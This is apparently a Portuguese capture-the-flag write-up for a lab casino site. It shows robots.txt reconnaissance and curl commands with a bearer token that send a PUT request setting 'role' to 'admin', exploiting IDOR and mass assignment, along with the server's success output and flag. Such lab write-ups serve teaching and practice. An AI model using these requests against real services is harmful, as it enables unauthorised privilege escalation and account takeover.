# DuckWare Team - Tanuki Bet
###### Solved by @Antonio-alexandre

> This is a CTF about IDOR, Privilege Escalation

## Desafio: Tanuki Bet (Exploração Web)
#### Introdução

Este desafio se trata de um site que contém numerosas flags. Para este writeup, foi explicado fazer escalonamento de privilégios para um usuário

- [Página do desafio](https://tanuki.hkomlabs.org/)

#### Análise Inicial

A princípio, ao acessar o site, nos deparamos com um site simples de cassino online.

Ao acessar o endpoint /robots.txt/, aparece o seguinte:

```
Disallow: /api/admin/secret/
Disallow: /api/admin/vault/
Disallow: /api/admin/keys/
Disallow: /api/download/
Disallow: /admin-panel/
Disallow: /api/users/
Disallow: /secret_backup/
```

Com isso, é possível notar alguns endpoints sensíveis que não deveriam estar expostos.

Ao executar um curl diretamente para a página `/api/users/17/`, aparece o seguinte:

```
{
    "id": 17,
    "username": "tnnn",
    "role": "user",
    ...
}
```

Como é possível notar, o usuário possui a role como `user`.

Nesse caso, o próximo passo é tentar escalonar a permissão para permitir o usuário se tornar `admin`

Como visto anteriormente no robots.txt, há o endpoint `/api/users/id/`. Nesse caso, como procedimento padrão para a tentativa de escalonamento, e como se trata de um backend em `Django`, há o endpoint `/update` ao tentar acessar com o método `PUT`.

Para isso, basta utilizar o curl com o seguinte payload:

```
curl -X PUT https://tanuki.hkomlabs.org/api/users/4/update/ \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxNywidXNlcm5hbWUiOiJ0bm5uIiwicm9sZSI6ImFkbWluIiwic2VjcmV0X25vdGUiOiIifQ.awoGL7pOYjYpZlsQ0Qa6ascPEnQg5O2PO4thBlWUO4c" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

Ele retorna o seguinte:

```
{
  "message": "Perfil atualizado com sucesso",
  "id": 17,
  "username": "tnnn",
  "role": "admin",
  "flag": "FLAG{1d0r_4dm1n_r0l3_3sc4l4t10n}"
}
```

Executando agora o curl para apenas visualizar o usuário:

```
curl -X GET https://tanuki.hkomlabs.org/api/users/4/ \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxNywidXNlcm5hbWUiOiJ0bm5uIiwicm9sZSI6ImFkbWluIiwic2VjcmV0X25vdGUiOiIifQ.awoGL7pOYjYpZlsQ0Qa6ascPEnQg5O2PO4thBlWUO4c" \
```

Aparece o seguinte:

```
{
    "id": 17,
    "username": "tnnn",
    "role": "admin",
    ...
}
```

### Conclusão

Para essa flag, foi possível identificar duas vulnerabilidades muito perigosas, que são elas: `IDOR` e `Mass Assignment`. Essas vulnerabilidades permitem que qualquer usuário modifique o campo `role` sem restrição nenhuma, ocasionando o escalonamento de privilégios. Tal situação em ambientes normais é uma falha grave, pois permite que qualquer usuário se torne admin de maneira fácil e rápida.


